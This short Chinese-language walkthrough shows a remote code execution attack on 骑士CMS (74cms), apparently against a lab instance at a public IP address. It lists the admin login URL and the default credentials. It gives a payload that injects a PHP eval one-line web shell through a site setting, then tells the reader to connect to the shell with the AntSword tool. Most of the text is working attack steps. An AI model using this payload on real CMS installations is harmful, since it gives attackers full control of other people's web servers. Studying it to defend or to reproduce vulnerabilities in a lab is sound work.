### 骑士CMS RCE

进入后台：

http://123.58.236.76:29396/index.php?m=Admin&c=index&a=login

账号密码为：

user:adminadmin

passwd:adminadmin



注意：修改显示phpinfo后，便不可再次正常显示登陆界面，需要重启环境，建议直接进行getshell操作

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220627113813.png)



再次进入后台登陆界面即可显示PHPinfo()

http://123.58.236.76:29396/index.php?m=Admin&c=index&a=login

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220627113941.png)



Getshell：

```
http://127.0.0.1/.',eval($_POST[pwd]),'/.com
```

保存并刷新

蚁剑连接：http://123.58.236.76:56869/index.php?m=Admin&c=index&a=index

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220627114620.png)